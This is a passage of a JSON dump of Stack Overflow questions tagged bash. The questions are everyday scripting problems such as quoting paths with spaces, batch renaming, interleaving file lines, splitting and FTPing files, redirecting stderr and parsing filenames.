Get filename argument\nif len(sys.argv) != 2:\n    print(\"USAGE: python libraryParser.py &lt;log_file.log&gt;\")\n    sys.exit(-1)\n\nfile = open(sys.argv[1], \"r\")\n\nsharedLibraries = []\nfor line in file:\n    if testForKeyword(\"NEEDED\", line):\n        libraryNameStart = line.find(\"[\") + 1\n        libraryNameFinish = line.find(\"]\")\n\n        libraryName = line[libraryNameStart:libraryNameFinish]\n\n        # No duplicates, only add if it does not exist\n        try:\n            sharedLibraries.index(libraryName)\n        except ValueError:\n            sharedLibraries.append(libraryName)\n\nfor library in sharedLibraries:\n    print(library)\n</code></pre>\n\n<p>Can you please help me solving this issue? \nThanks in advance.</p>\n"},{"tags":["osx","bash","google-chrome"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12606397,"title":"Copying file with spaces on Mac","body":"<p>I'm trying in a shell script to copy a predefined set of Chrome bookmarks to the location where Chrome keeps them on a Mac (<code>~/Library/Application Support/Google/Chrome/Default</code>).  In the script I have:</p>\n\n<pre><code>#!/bin/sh\nbookmarks_dir=\"$HOME/Library/Application\\ Support/Google/Chrome/Default\"\ncp -v \"bookmarks/Bookmarks\" \"$bookmarks_dir\"\n</code></pre>\n\n<p>But when I run this I get:</p>\n\n<pre><code>cp: /Users/aparkin/Library/Application\\ Support/Google/Chrome/Default: No such file or directory\n</code></pre>\n\n<p>If I copy &amp; paste the path in the error message above and do the cp by hand:</p>\n\n<pre><code>cp -v bookmarks/Bookmarks /Users/aparkin/Library/Application\\ Support/Google/Chrome/Default\n</code></pre>\n\n<p>It copies fine, so the directory does in fact exist.  It seems to be the space in the path that's tripping things up.</p>\n\n<p>What am I missing?  I thought if a variable is enclosed in quotes that spaces in filenames no longer cause problems?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12601639,"title":"How to set Hyperlinks in the mail sent from Unix Box?","body":"<p>I am sending a mail from my unix machine to my Outlook. I want to add a hyperlink to the content of the mail so that I can click on that hyperlink so that it will go to that particular line.. Please help..</p>\n\n<p>eg..\nSubject: Testsmail</p>\n\n<p>para1  para2  para 3 ... hyperlinks to be set here</p>\n\n<p>Sabarish bnadzsbcl blkbklbaklb lkbkl bklb lbkbklb klb kl blkbklbbnlb blblkbklblkbklblkblblkbklbklbklbklbladvgfuqggvwhipowehopvhwpohpohvwhbhahhkvk</p>\n\n<p>Happy ksankqihfoihihfihiqhfihqiwfhoiqhfihqfoihiqhihqfihihqfehiqhfihfoiqhifhihqfoiiwhfihqoihiqhcbakbkbckabkcbbakbcjabkjbckabkabkbkacbkcakjbkcakba</p>\n\n<p>Sad a';sjcf;la;fja;;fjajfajjfclaj;lajsljf;ljaljfaljvgaswdegfuewweifwiuggfwguiqw</p>\n\n<p>Here If i click on para1 it should come to Sabarish..</p>\n"},{"tags":["bash","unix","text","text-files"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12596814,"title":"Clever bash solution to rearrange lines from text files?","body":"<p>I have 100 files, each with 1000 lines:</p>\n\n<pre><code>$ cat 1.txt\nline1.1\nline1.2\n...\nline1.1000\n\n$ cat 2.txt\nline2.1\nline2.2\n...\nline2.1000\n\n...\n\n$ cat 100.txt\nline100.1\nline100.2\n...\nline100.1000\n</code></pre>\n\n<p>What's the easiest way to interleave them so that I end up with 1000 files, each with 100 lines, such that the first file contains all first lines from the 100 files, the second file contains all second lines from the 100 files, and so on:</p>\n\n<pre><code>$ cat 1.txt\nline1.1\nline2.1\n...\nline100.1\n\n$ cat 2.txt\nline1.2\nline2.2\n...\nline100.2\n\n...\n\n$ cat 1000.txt\nline1.1000\nline2.1000\n...\nline100.1000\n</code></pre>\n\n<p>I could write a Python script, but I was wondering if there is a clever solution that uses UNIX tools. </p>\n"},{"tags":["bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":3628,"score":0,"question_id":8352851,"title":"How to call shell script from another shell scripts?","body":"<p>Please mention sample code to call or run another script function from different scripts. (Given the <a href=\"http://www.gnu.org/software/bash/manual/bashref.html\" rel=\"nofollow\">Bash</a> shell.)</p>\n"},{"tags":["linux","bash","script","dns"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":110,"score":0,"question_id":11805508,"title":"Get random site names in bash","body":"<p>I'm making a script that calculate the distribution of the words in the web. What I have to do is check as many random web sites as I can and count the number of words in those sites, list them, and order them so that the word that occurs the majority of the times is a the top of the list. What I'm doing is generating random ip numbers:</p>\n\n<pre><code>a=`expr $RANDOM % 255`\nlet \"a+=1\"\nb=`expr $RANDOM % 256`\nc=`expr $RANDOM % 256`\nd=`expr $RANDOM % 256`\nip=$a.$b.$c.$d\n</code></pre>\n\n<p>after that with nmap I check if the port 80 or 8080 is open on those sites so that there is a chance that it's a web site.</p>\n\n<p>if I'm sure the ip doesn't belong to a web site I add the address to a black list file so that it doesn't get checked again.</p>\n\n<p>If the port 80 or the port 8080 is open then I have to resolve the ip with a reverse lookup and get all the domain names that belong to that ip.</p>\n\n<p>the problem is that if I do one of these commands, the output is only the single PTR record, while there can be multiple:</p>\n\n<pre><code>dig -x ipaddres +short\nnslookup ipaddress\nhost ipaddress\n</code></pre>\n\n<p>I prefere this to be solved in bash, but if there is solution in C, it could help as well</p>\n\n<p>After that I copy the web site page to a file using w3m and I count the word occurrences.</p>\n\n<p>Also here I have another problem, is there a way to check al the available public pages that belong to the site and not only the index one?</p>\n\n<p>Any help is appreciated</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12604468,"title":"Find and delete .txt files in bash","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11191475/command-line-piping-find-results-to-rm\">Command line: piping find results to rm</a>  </p>\n</blockquote>\n\n\n\n<p>recently frigged up my external hard drive with my photos on it (most are on DVD anyway, but..) by some partition friggery.</p>\n\n<p>Fortunately I was able to put things back together with PhotoRec another Unix partition utility and PDisk.</p>\n\n<p>PhotoRec returned over one thousand folders chalk full of anything from .txt files to important .NEF's.</p>\n\n<p>So I tried to make the sorting easier by using unix since the OSX Finder would simply crumble under such requests as to select and delete a billion .txt files.</p>\n\n<p>But I encounter some BS when I tried to find and delete txt files, or find and move all jpegs recursively into a new folder called jpegs. I am a unix noob so I need some assistance please.</p>\n\n<p>Here is what I did in bash. (I am in the directory that ls would list all the folders and files I need to act upon).</p>\n\n<p>find . -name *.txt | rm</p>\n\n<p>or </p>\n\n<p>sudo find . -name *.txt | rm -f</p>\n\n<p>So it's giving me some BS that I need to unlink the files. Whatever.</p>\n\n<p>I need to find all .txt files recursively and delete them preferably verbose.</p>\n\n<p>Thanks.</p>\n"},{"tags":["regex","bash","shell","find"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12602936,"title":"find all files except e.g. *.xml files in shell","body":"<p>Using bash, how to find files in a directory structure except for *.xml files?\nI'm just trying to use </p>\n\n<pre><code>find . -regex ....\n</code></pre>\n\n<p>regexe:</p>\n\n<pre><code>'.*^((?!xml).)*$'\n</code></pre>\n\n<p>but without expected results...</p>\n\n<p>or is there another way to achieve this, i.e. without a regexp matching?</p>\n"},{"tags":["bash","unix","wildcard","rename"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12601373,"title":"Using Wildcards with 'rename'","body":"<p>I have been using the <code>rename</code> command to batch rename files.  Up to now, I have had files like:</p>\n\n<pre><code>2010.306.18.08.11.0000.BO.ADM..BHZ.SAC\n2010.306.18.08.11.0000.BO.AMM..BHZ.SAC\n2010.306.18.08.11.0000.BO.ASI..BHE.SAC\n2010.306.18.08.11.0000.BO.ASI..BHZ.SAC\n</code></pre>\n\n<p>and using <code>rename 2010.306.18.08.11.0000.BO. \"\" *</code> and <code>rename .. _. *</code> I have reduced them to:</p>\n\n<pre><code>ADM_.BHZ.SAC\nAMM_.BHZ.SAC\nASI_.BHE.SAC\nASI_.BHZ.SAC\n</code></pre>\n\n<p>which is exactly what I want.  A bit clumsy, I guess, but it works.  The problem occurs now that I have files like:</p>\n\n<pre><code>2010.306.18.06.12.8195.TW.MASB..BHE.SAC\n2010.306.18.06.14.7695.TW.CHGB..BHN.SAC\n2010.306.18.06.24.4195.TW.NNSB..BHZ.SAC\n2010.306.18.06.25.0695.TW.SSLB..BHZ.SAC\n</code></pre>\n\n<p>which exist in the same folder.  I have been trying to get the similar results to above using wildcards in the <code>rename</code> command eg. <code>rename 2010.306.18.*.*.*.*. \"\"</code> but this appends the first appearance of <code>2010.306.18.*.*.*.*.</code> to the beginning of all the other files - clearly not what I'm after, such that I get:</p>\n\n<pre><code>2010.306.18.06.12.8195.TW.MASB..BHE.SAC\n2010.306.18.06.12.8195.TW.MASB..BHE.SAC2010.306.18.06.14.7695.TW.CHGB..BHN.SAC\n2010.306.18.06.12.8195.TW.MASB..BHE.SAC2010.306.18.06.24.4195.TW.NNSB..BHZ.SAC\n2010.306.18.06.12.8195.TW.MASB..BHE.SAC2010.306.18.06.25.0695.TW.SSLB..BHZ.SAC\n</code></pre>\n\n<p>I guess I am not understanding a fairly fundamental principal of wildcards here so, can someone please explain why this doesn't work and what I can do to get the desired result (preferably using <code>rename</code>).</p>\n\n<hr>\n\n<p><strong>N.B.</strong></p>\n\n<p>To clarify, the output wants to be:</p>\n\n<pre><code>ADM_.BHZ.SAC\nAMM_.BHZ.SAC\nASI_.BHE.SAC\nASI_.BHZ.SAC\nMASB.BHE.SAC\nCHGB.BHN.SAC\nNNSB.BHZ.SAC\nSSLB.BHZ.SAC\n</code></pre>\n"}]}
{"total":16352,"page":17,"pagesize":100,"questions":[{"tags":["bash","ubuntu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12603776,"title":"defining function in MOTD (Ubuntu)","body":"<p>Is it possible to define a function in the MOTD on a Ubuntu box?</p>\n\n<p>I have the following in my motd.tail file:</p>\n\n<pre><code>#!/bin/sh\n? () { echo \"$*\" | bc -l; }\necho\ndate\necho\n</code></pre>\n\n<p>However the function definition doesn't work if I login to the box, i.e.:</p>\n\n<pre><code>? 10*2\n?: command not found\n</code></pre>\n\n<p>Any ideas on how I can define the function?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","eof","unexpectendoffile"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12579646,"title":"bash script prova.sh: line 76: syntax error: unexpected end of file","body":"<p>I have below script but I can't find the error. Somebody an help me ?</p>\n\n<p>In concrete I split a big file in different then compress any file, move it and send by ftp rename destination filename.</p>\n\n<p>Something not work :(</p>\n\n<p>in line:\nput ${file} ${7}.T${j}(+1)</p>\n\n<p>I try to rename the file with (+1) ended new filename</p>\n\n<p>Kind regards</p>\n\n<pre><code>#!/bin/bash\n\n# configuration stuff\n\n# ${1} absolute path file\n# ${2} num_files\n# ${3} output_filename\n# ${4} ipMainframe ip to put files\n# ${5} FTP username\n# ${6} FTP password\n# ${7} destination filename\n\nif [ ! $# == 7 ]; then\n        #number of parameter different of two\n        echo \"Number of parameter incorrect\"\n        echo \"Command use: LLP_split_gzip_sendFTPandTrigger.sh absolute_path_file number_of_pieces output_filename ipMainframe userFTP pwdFTP destinationFilename\"\n        exit 1\nfi\n\nif [ -f ${1} ]; then\n        # If file exists\n        if [[ ${2} =~ ^[\\-0-9]+$ ]] &amp;&amp; (( ${2} &gt; 0)); then\n                # if number of pieces is an integer &gt; 0\n                #Remove old files\n                echo \"home directory = $HOME\"\n                CMD=`rm -f '\"$HOME\"/\"$3\"*'`\n                if [ $? != 0 ]; then\n                        echo \"Impossible to remove old files $home/llp_tmp* $home/\"$3\"* in home directory\"\n                        echo $CMD\n                fi\n                # Calculate line for every file splitted\n                total_lines=$(cat ${1} | wc -l)\n                ((lines_per_file = (total_lines + ${2} - 1) / ${2}))\n                # Split the actual file, maintaining lines.\n                CMD=`split -l \"$lines_per_file\" \"$1\" \"$HOME\"/llp_tmp`\n                if [ $? != 0 ]; then\n                        echo \"SPLITTING FILE ERROR: problem to split file.\"\n                        echo $CMD\n                        exit 3\n                fi\n                #For every file splitted rename and zip it\n                i=1\n                for file in $HOME/llp_tmp*; do\n                        CMD=`mv \"$file\" \"$3\".\"$i\"`\n                        if [ $? != 0 ]; then\n                                echo \"Impossible to rename file\"\n                                echo $CMD\n                                exit 5\n                        fi\n                        CMD=`gzip \"$3\".\"$i\"`\n                        if [ $? != 0 ]; then\n                                echo \"Impossible to compress file $3.$i\"\n                                echo $CMD\n                                exit 6\n                        fi\n                        i=`expr $i + 1`\n                done\n                ftp -n ${4} &lt;&lt; EOF\n\n                j=1\n                user ${5} ${6}\n                for file in $3.*; do\n                        put ${file} ${7}.T${j}(+1)\n                        j=`expr $j + 1`\n                done\n                quit\n        else\n                echo \"number of pieces second parameter must be more than 0.\"\n                exit 2\n        fi\nelse\n        echo \"absolute path first paramater doesnt exist\"\n        exit 1\nfi\nexit 0\n</code></pre>\n"},{"tags":["c#","perl","bash","mono"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12548483,"title":"C# mono diagnostic bash vs perl backticks","body":"<p>I've installed mono on my ubuntu box and I'm trying to start a processes which starts several other children processes using C# but the program has very strict requirements and isn't starting correctly because of a environmental variable issues. When I call the program using backticks in perl it works fine. Can someone tell me how to emulate the backtick function in C#?</p>\n\n<pre><code>        System.Diagnostics.ProcessStartInfo ps = new System.Diagnostics.ProcessStartInfo(\"bash\");//perl /home/casey/Downloads/rosetta3.4/rosetta_tools/fragment_tools/make_fragments.pl tempsequence.fa\n        ps.RedirectStandardInput=true;\n            ps.RedirectStandardOutput = true;\n        ps.RedirectStandardError = true;\n        System.Diagnostics.Process proc = new System.Diagnostics.Process();\n        proc.StartInfo = ps;\n        ps.UseShellExecute = false;\n        proc.Start();\n        proc.StandardInput.WriteLine(\"cd \"+ projectfolder+\"/\"+projectname+\" ; perl /home/casey/Downloads/rosetta3.4/rosetta_tools/fragment_tools/make_fragments.pl tempsequence.fa;exit;\");\n            proc.WaitForExit();\n</code></pre>\n\n<p>This is the error it generates when run under C# it runs fine in perl.</p>\n\n<pre><code>/home/casey/Downloads/sparks-x/bin/buildinp_query.sh: 4: [: /home/casey/Downloads/sparks-x: unexpected operator\n/home/casey/Downloads/sparks-x/bin/psiblast.sh: 21: /home/casey/Downloads/sparks-x/bin/psiblast.sh: /blast/bin/blastpgp: not found\nTraceback (most recent call last):\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 255, in run1\n    buildinp(fphipsiss, fmat, finp)\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 238, in buildinp\n    seq1, ssec1, phipsi1, Fphipsi = rdphipsi(fphipsiss)\n  File \"/home/casey/Downloads/sparks-x/bin/buildinp.py\", line 9, in rdphipsi\n    for line in file(fn):\nIOError: [Errno 2] No such file or directory: 't001_.fasta.phipsi'\nsparks failed!\n\nno id specified. parsing filename instead.\nINTERMEDIATE: tempsequence.fa\nID: t001 CHAIN: _\nFile for psipred not found! Generating from scratch instead.\npicking fragments with options:\n                       DEBUG: 1\n            add_pdbs_to_vall: \n                       chain: _\n                     cleanup: 1\nexclude_homologs_by_pdb_date: 0\n                           f: tempsequence.fa\n                   fastafile: t001_.fasta\n                        homs: 1\n                          id: t001\n                n_candidates: 1000\n                     n_frags: 200\n             old_name_format: 0\n                  pick_frags: 1\n                      porter: 0\n                 porter_file: \n                     psipred: 1\n                psipred_file: \n                      rundir: /media/d5ad6bd2-65b3-498f-8355-5b2c55ee42b2/top10demo/automate/projects/showerror\n                       runid: t001_\n                         sam: 0\n                    sam_file: \n                 torsion_bin: 0\n--------------------------------------------------------------------------------\n\nFILENAME: t001_.fasta\nSequence: GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\nrunning sparks for phi, psi, and solvent accessibility predictions\n/home/casey/Downloads/sparks-x/bin/buildinp_query.sh t001_.fasta\nrunning psiblast for sequence: t001_.fasta\nAt line 180 of file phipsi_ss0.f\nFortran runtime error: Bad real number in item 3 of list input\nAborting: Can't run first SS0 predictor\nError in file: t001_.fasta.phipsi\n</code></pre>\n"},{"tags":["bash","shell","script"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12588884,"title":"Extract part of file name with multiple sections","body":"<p>I am trying to extract part of a file name to compare with other file names as it is the only part that does not change. here is the pattern and an example</p>\n\n<p>clearinghouse.doctype.payer.transID.processID.date.time\nEMDEON.270.60054.1234567890123456789.70949996.20120925.014606403</p>\n\n<p>all sections are the same length at all times with the exception of clearinghouse &amp; doctype that can vary in character length. </p>\n\n<p>The part of the filename that i need for comparison is the transID. </p>\n\n<p>What would be the cleanest shortest way to do this in a shell script. </p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12601439,"title":"Symlinks - performance hit?","body":"<p>For deployment reasons, it is slightly easier for me to use symlinks, but these would be for all of my websites core files and configurations which will be accessed 10’s of thousands of times a day.</p>\n\n<p>Am I more sensible to move the documents to the correct positions on the server (slightly more problematic deployment) rather than using symlinks for everything (slight performance degradation?)</p>\n"},{"tags":["bash","rgrep"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":12601177,"title":"How can i show only the the files (path included) that contain a word using rgrep?","body":"<p>I'm using this command below to find all the files that contain a string, but it shows not only the file but the line where the string is..</p>\n\n<pre><code>rgrep \"foobar\" .\n</code></pre>\n\n<p>How can show only the name of the files (path included)?</p>\n"},{"tags":["bash","cygwin"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12407325,"title":"cygwin 1.7.15 handling of \"set -e\" in shell scripts (error in sub-shell causes parent to exit)","body":"<p>I am using this:</p>\n\n<pre><code>$ uname -a\nCYGWIN_NT-6.1 bassoon 1.7.15(0.260/5/3) 2012-05-09 10:25 i686 Cygwin\n$ bash --version\nGNU bash, version 4.1.10(4)-release (i686-pc-cygwin)\n$ cat myexpr.sh\n#!/bin/sh\n\necho \"In myexpr, Before  expr\"\nac_optarg=`expr x--with-gnu-as : 'x[^=]*=\\(.*\\)'`\necho \"ac_optarg=$ac_optarg\"\necho \"In myexpr, After  expr\"\n\n$ cat myexpr2.sh\n#!/bin/sh\n\nset -e\n\necho \"In myexpr, Before  expr\"\nac_optarg=`expr x--with-gnu-as : 'x[^=]*=\\(.*\\)'`\necho \"ac_optarg=$ac_optarg\"\necho \"In myexpr, After  expr\"\n</code></pre>\n\n<p>The only difference between the two scripts is that myexpr2.sh uses \"set -e\"</p>\n\n<pre><code>$ echo $$\n2880\n$ ./myexpr.sh\nIn myexpr, Before  expr\nac_optarg=\nIn myexpr, After  expr\n$ ./myexpr2.sh\nIn myexpr, Before  expr\n</code></pre>\n\n<p>Expected behavior, so far.</p>\n\n<p>If I do this in the parent shell (PID 2880, above):</p>\n\n<pre><code>$ set -e\n$ ./myexpr.sh\n</code></pre>\n\n<p>The parent shell exits! That is pID 2880 above where I did the \"set -e\"</p>\n\n<p>This is not the behavior on Linux or cygwin 1.5.12. Is this a bug in cygwin or BASH on cygwin?</p>\n"},{"tags":["bash","testing","map","null","empty-string"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12599506,"title":"How to distinguish between null and empty string when retrieving from a bash map","body":"<p>I am having trouble finding out how to check for null (or unset?) within a bash map.\nThat is, I want to treat the empty string I can place in a map differently from the case where I have placed nothing at all in the map (for that particular key).</p>\n\n<p>for example, looking at the code:</p>\n\n<pre><code>#!/bin/bash\n\ndeclare -A UsersRestrictions\nUsersRestrictions['root']=\"\"\n\n\nif [[ -z \"${UsersRestrictions['root']}\" ]] ; then\n    echo root null\nelse \n    echo root not null\nfi\n\nif [[ -z \"${UsersRestrictions['notset']}\" ]]; then\n    echo notset null\nelse \n    echo notset not null\nfi\n</code></pre>\n\n<p>I would hope the test for \"root\" give me 'not null' and the test for \"notset\" give me 'null'. But I get the same result in both cases. I have searched for other possible methods, but all give me the same results so far. Is there a way to achieve this?</p>\n\n<p>thanks!</p>\n"},{"tags":["bash","logging","chef","recipe"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12594855,"title":"chef logging of wget","body":"<p>I have a chef recipe that looks something like:</p>\n\n<pre><code>Chef::Log.info('step1')\n# do stuff\n\nChef::Log.info('step2')\nbash \"do_wget\" do\n  code &lt;&lt;-EOF\n  wget somefile\n  EOF\nend\n\nChef::Log.info('step3')\n# do stuff\n</code></pre>\n\n<p>The wget takes a while but the logging ends up looking like</p>\n\n<pre><code>step1    \nstep2    \nstep3\nbash script runs #indicates that the bash script from step 2 is running\n</code></pre>\n\n<p>Is there a way to prevent the logging from step3 until the bash script is done executing?</p>\n"},{"tags":["bash","node.js","command-line-arguments","handlebars.js"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12588402,"title":"How to output a list of files on bash command line","body":"<p>I am using handlebars.js to render client-side templates (using Jade on the node.js server-side) for our single-page app.</p>\n\n<p>I want to precompile the handlebars templates on the server side and bundle them up as one JS file to send to the client.</p>\n\n<p>Currently, I use <code>handlebars</code> to compile templates like so:</p>\n\n<pre><code>$ handlebars template1.handlebars template2.handlebars -f precompiled_templates.js\n</code></pre>\n\n<p>I'd like to write a bash script that can read all the <code>*.handlebars</code> files in a directory and then run them through the handlebars compiler.  So, if I had a directory like so:</p>\n\n<pre><code>templates/\n  temp1.handlebars\n  temp2.handlebars\n  temp3.handlebars\n  temp4.handlebars\n</code></pre>\n\n<p>Running my bash script (or, one line command) in the templates directory would essentially run the following <code>handlebars</code> command:</p>\n\n<pre><code>$ handlebars temp1.handlebars temp2.handlebars temp3.handlebars temp4.handlebars -f precompiled_templates.js\n</code></pre>\n\n<p>Does anyone know how I could write a bash script to get all the handlebars files in a directory onto the command line like above?</p>\n"},{"tags":["bash","sed","awk","tr"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":12586039,"title":"Remove everything but brackets with sed, then indent","body":"<p>I have a huge file, a really huge file (some 600+MB of text). In fact they are <code>jsons</code>. Each <code>json</code> is on a new line and only comes in a few flavours.</p>\n\n<p>They look like:</p>\n\n<pre><code>{\"text\":{\"some nested words\":\"Some more\",\"something else\":\"Yeah more stuff\",\"some list\":[\"itemA\",\"ItemB\",\"itemEtc\"]},\"One last object\":{\"a thing\":\"and it's value\"}}\n</code></pre>\n\n<p>And what I want is it go through with sed, suck out the text, and for each nexted pair put in some indent, so we get:</p>\n\n<pre><code>{\n -{\n--[]\n -}\n--{}\n -}\n}\n</code></pre>\n\n<p>(I'm not 100% sure I got the nesting right on the output, I think it's right)</p>\n\n<p>Is this possible? I saw <a href=\"http://stackoverflow.com/questions/10558826/remove-everything-between-pairs-of-braces-with-sed\">this</a>, which was the closest I could imagine it being, but that gets rid of the brackets two. </p>\n\n<p>I've noticed the answer there uses braching, so I think I need that, and I'll need to do some kind of <code>s/pattern/newline+tab/space/g</code> type command but I can't figure out how or what to make that...</p>\n\n<p>Could someone help please? It needn't be pure <code>sed</code> but that is prefered.</p>\n"},{"tags":["bash","sed","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12560791,"title":"sed pattern ending with a specific character or the end of line","body":"<p>I use <code>grep v2.5.1</code> and I want to colorize the filename within the grep output.</p>\n\n<p>I could use another grep command with pattern <code>/[^/:]*\\(:\\|$\\)</code>:</p>\n\n<pre><code>grep --color=always something */*    | grep --color '/[^/:]*\\(:\\|$\\)'\n</code></pre>\n\n<p>and this same pattern also works to list files:</p>\n\n<pre><code>grep --color=always something */* -l | grep --color '/[^/:]*\\(:\\|$\\)'\n</code></pre>\n\n<p>But I would prefer a <code>sed</code> command, and I do not know how to translate <code>\\(:\\|$\\)</code> in <code>sed</code> :-(</p>\n\n<p>For instance:</p>\n\n<pre><code>echo 'dir/file: xxxx' | sed 's|/\\([^/:]*\\)(:|$)|/\\o033[1;35m\\1\\o033[0m\\2|'\n</code></pre>\n\n<p>FYI, my complete function in <code>~/.bashrc</code></p>\n\n<pre><code>gg() {\n    find . -name .svn -prune -o -type f '(' -name '*.java' -o -name '*.h' -o -name '*.cpp' -o -name 'Make*' -o -name '*.sh' ')' -print0 |\n    xargs -0 grep --color=always \"$@\" |\n    sed 's|/\\([^/:]*\\)(:|$)|/\\o033[1;35m\\1\\o033[0m\\2|'\n}\n</code></pre>\n"},{"tags":["bash","redirect","stdout"],"answer_count":3,"favorite_count":8,"up_vote_count":18,"down_vote_count":0,"view_count":13055,"score":18,"question_id":549737,"title":"How can I redirect STDERR to STDOUT, but ignore the original STDOUT?","body":"<p>I have a program whose <code>STDERR</code> output I want to inspect and run <code>grep</code> on etc.</p>\n\n<p>So I could redirect it to <code>STDOUT</code> and use grep, but the problem is, I do <em>not</em> want the original <code>STDOUT</code> content.</p>\n\n<p>So, this one won't do</p>\n\n<pre><code>cmd 2&gt;&amp;1 | grep pattern\n</code></pre>\n\n<p>because it will mix the original STDOUT and STDERR.</p>\n\n<p>And this one doesn't work since grep doesn't read the STDERR output:</p>\n\n<pre><code>cmd 1&gt;/dev/null | grep pattern\n</code></pre>\n\n<p>But also, this one won't work:</p>\n\n<pre><code>cmd 1&gt;/dev/null 2&gt;&amp;1 | grep pattern\n</code></pre>\n\n<p>because the output will be completely empty, since everything gets written to <code>/dev/null</code>.</p>\n\n<p>But there must be a simple way to do it?</p>\n"},{"tags":["bash","string","filenames"],"answer_count":15,"favorite_count":98,"up_vote_count":179,"down_vote_count":1,"view_count":129690,"score":178,"question_id":965053,"title":"Extract filename and extension in bash","body":"<p>I want to get the filename (without extension) and the extension separately.</p>\n\n<p>The best solution I found so far is:</p>\n\n<pre><code>NAME=`echo \"$FILE\" | cut -d'.' -f1`\nEXTENSION=`echo \"$FILE\" | cut -d'.' -f2`\n</code></pre>\n\n<p>This is wrong because it doesn't work if the file name contains multiple \".\" characters. If let's say I have <strong>a.b.js</strong> it will consider <strong>a</strong> and <strong>b.js</strong>, instead of <strong>a.b</strong> and <strong>js</strong>.</p>\n\n<p>It can be easily done in Python with</p>\n\n<pre><code>file, ext = os.path.splitext(path)\n</code></pre>\n\n<p>but I'd prefer not to fire a Python interpreter just for this, if possible.</p>\n\n<p>Any better ideas?</p>\n"},{"tags":["regex","bash","text","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12587047,"title":"sed to remove content between two patterns","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6854586/extract-data-from-html-table-with-bash-script\">Extract data from HTML table with BASH script</a>  </p>\n</blockquote>\n\n\n\n<p>I have an html file that contains the following content. I want to use sed to remove all the content (multiline) between the patterns <code>&lt; script ..... &gt;</code> and <code>&lt;/script&gt;</code> and leave the rest as it is. I also want to remove the tags.</p>\n\n<p>Any help would be appreciated. thanks!\nI tried both of the following but with no luck.</p>\n\n<pre><code>cat test.html | tr -d '\\n' | sed 's/&lt; script.*&lt;\\/script&gt;//g' &gt; output.txt\n</code></pre>\n\n<p>and</p>\n\n<pre><code>sed '/&lt; script/,/&lt;\\/script&gt;/d' test.html &gt; output.txt    \n</code></pre>\n\n<hr>\n\n<pre><code>don't touch this.\n\nthis is not to be removed &lt; script bla bla&gt; this is to be\n\nremoved. &lt; /script&gt; this is going to\n\nstay &lt; script bla bla bla bla bla&gt; remove this\n\nand this \n\nand this &lt; /script&gt; and this stays as is.\n\nthis too.\n</code></pre>\n\n<hr>\n"},{"tags":["bash","shell","stdout","stdin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12594364,"title":"Can I output multiple files to STDOUT and process them individually?","body":"<p>I'm using ImageMagick's <a href=\"http://www.imagemagick.org/script/convert.php\" rel=\"nofollow\">convert</a> program to split a pdf file into individual images. It allows you to write the output to STDOUT by specifying '-' as the output file.</p>\n\n<p>I'd like to process all these images and then re-merge them. Unfortunately, when I pipe the output into a new process, it doesn't recognize the stream as individual image files. Writing all the images to the disk and then reading them with a different program would obviously be a waste of time, so <strong>is there a way to write multiple files to STDOUT pipe such that each one is the STDIN of it's another image-editing instance?</strong> \nCan the output of these image-editing instances be merged into the input of a final merging process?</p>\n"},{"tags":["linux","bash","unix","terminal","grep"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":106,"score":2,"question_id":12536927,"title":"Bash: How to keep lines in a file that have fields that match lines in another file?","body":"<p>I have two big files with a lot of text, and what I have to do is keep all lines in file A that have a field that matches a field in file B.</p>\n\n<p>file A is something like:</p>\n\n<pre><code>Name (tab)  #  (tab)  #  (tab)  KEYFIELD  (tab)  Other fields\n</code></pre>\n\n<p>file B I managed to use cut and sed and other things to basically get it down to one field that is a list.</p>\n\n<p>So The goal is to keep all lines in file A in the 4th field (it says KEYFIELD) if the field for that line matches one of the lines 